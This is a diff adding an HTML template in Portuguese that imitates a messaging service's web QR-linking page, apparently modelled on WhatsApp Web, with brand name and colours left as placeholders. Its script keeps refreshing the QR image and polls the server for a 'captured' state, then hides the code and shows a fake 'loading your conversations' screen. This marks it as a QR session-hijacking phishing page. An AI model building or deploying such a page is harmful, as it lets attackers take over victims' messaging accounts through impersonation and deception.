@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>{{TITLE}}</title>
+<style>
+  :root { --accent: {{COLOR}}; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body { height: 100%; }
+  body {
+    font-family: "Segoe UI", Helvetica, Arial, sans-serif;
+    background: #e9edef;
+    color: #111b21;
+    display: flex;
+  }
+  aside {
+    background: var(--accent);
+    color: #fff;
+    width: 34%;
+    min-width: 280px;
+    padding: 48px 36px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    gap: 18px;
+  }
+  aside h1 { font-size: 30px; font-weight: 600; line-height: 1.2; }
+  aside h1 small { display: block; font-size: 15px; font-weight: 400; opacity: .85; margin-top: 6px; }
+  aside .tag { font-size: 15px; opacity: .9; max-width: 320px; }
+  main {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 24px;
+  }
+  .card {
+    background: #fff;
+    border-radius: 10px;
+    box-shadow: 0 1px 3px rgba(11, 20, 26, .13);
+    padding: 44px 56px;
+    text-align: center;
+    max-width: 480px;
+    width: 100%;
+  }
+  .card h2 { font-size: 26px; font-weight: 300; margin-bottom: 22px; color: #41525d; }
+  .card ol { text-align: left; margin: 0 auto 26px; max-width: 330px; color: #667781; font-size: 15px; line-height: 1.7; padding-left: 20px; }
+  .qrwrap {
+    display: inline-block;
+    padding: 12px;
+    border: 1px solid #d9dbdc;
+    border-radius: 8px;
+    background: #fff;
+  }
+  .qrwrap img { width: 220px; height: 220px; image-rendering: pixelated; display: block; }
+  .foot { margin-top: 22px; color: #8696a0; font-size: 13.5px; }
+  .spinwrap { position: fixed; inset: 0; background: rgba(255,255,255,.97); display: none; align-items: center; justify-content: center; flex-direction: column; gap: 18px; z-index: 10; }
+  .spin { width: 46px; height: 46px; border: 4px solid #d9dbdc; border-top-color: var(--accent); border-radius: 50%; animation: s 1s linear infinite; }
+  @keyframes s { to { transform: rotate(360deg); } }
+  .spinwrap p { color: #667781; font-size: 15px; }
+  @media (max-width: 760px) { aside { display: none; } }
+</style>
+</head>
+<body>
+  <aside>
+    <h1>{{TITLE}}<small>Web</small></h1>
+    <p class="tag">{{TAGLINE}}</p>
+  </aside>
+  <main>
+    <div class="card">
+      <h2>Usar o {{TITLE}} no computador</h2>
+      <ol>
+        <li>Abra o {{TITLE}} no seu celular</li>
+        <li>Toque em <b>Aparelhos conectados</b> e depois em <b>Conectar um aparelho</b></li>
+        <li>Aponte o celular para esta tela para escanear o código</li>
+      </ol>
+      <div class="qrwrap"><img id="qr" src="/qr.png" alt="Código QR"></div>
+      <p class="foot">{{FOOTER}}</p>
+    </div>
+  </main>
+  <div id="loading" class="spinwrap">
+    <div class="spin"></div>
+    <p>Carregando suas conversas…</p>
+  </div>
+<script>
+  const REFRESH_MS = {{REFRESH_MS}};
+  const qr = document.getElementById("qr");
+  const loading = document.getElementById("loading");
+
+  setInterval(() => { qr.src = "/qr.png?t=" + Date.now(); }, REFRESH_MS);
+
+  async function checkStatus() {
+    try {
+      const r = await fetch("/status.json", { cache: "no-store" });
+      const j = await r.json();
+      if (j.state === "captured") {
+        qr.parentElement.style.display = "none";
+        document.querySelector("ol").style.display = "none";
+        loading.style.display = "flex";
+      }
+    } catch (e) { /* silencioso */ }
+  }
+  checkStatus();
+  setInterval(checkStatus, 2000);
+</script>
+</body>
+</html>
